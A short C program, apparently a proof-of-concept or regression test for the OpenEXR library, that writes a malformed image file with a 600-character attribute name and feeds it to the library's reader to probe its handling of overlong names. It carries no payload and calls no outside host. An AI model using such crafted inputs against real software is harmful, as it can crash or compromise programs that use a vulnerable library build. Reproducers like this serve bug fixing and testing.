#include <openexr.h>

#include <stdio.h>
#include <stdlib.h>

int
main (void)
{
    char path[] = "/tmp/poc_longnameXXXXXX";
    int fd = mkstemp (path);
    if (fd < 0) return 0;
    FILE* f = fdopen (fd, "wb");
    if (!f) return 0;

    unsigned char mag[8] = { 0x76, 0x2f, 0x31, 0x01, 0x02, 0x00, 0x00, 0x00 };
    fwrite (mag, 1, 8, f);
    for (int i = 0; i < 600; ++i)
        fputc ('A', f);
    fputc ('\0', f);
    fclose (f);

    exr_context_t c = NULL;
    exr_start_read (&c, path, NULL);
    if (c) exr_finish (&c);
    remove (path);
    return 0;
}
